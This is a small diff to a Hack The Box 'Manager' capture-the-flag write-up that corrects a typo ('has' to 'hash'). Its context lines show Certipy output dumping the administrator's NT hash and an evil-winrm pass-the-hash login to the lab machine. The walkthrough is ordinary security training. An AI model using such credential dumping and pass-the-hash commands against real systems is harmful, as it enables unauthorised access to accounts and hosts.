@@ -292,7 +292,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
 ```
-As we have the administrator has I leveraged it to gain access through Evil-WinRM.
+As we have the administrator hash, I leveraged it to gain access through Evil-WinRM.
 ```bash
 ┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]
 └─# evil-winrm -i 10.129.220.78 -u administrator -H ae5064c2f62317332c88629e025924ef 
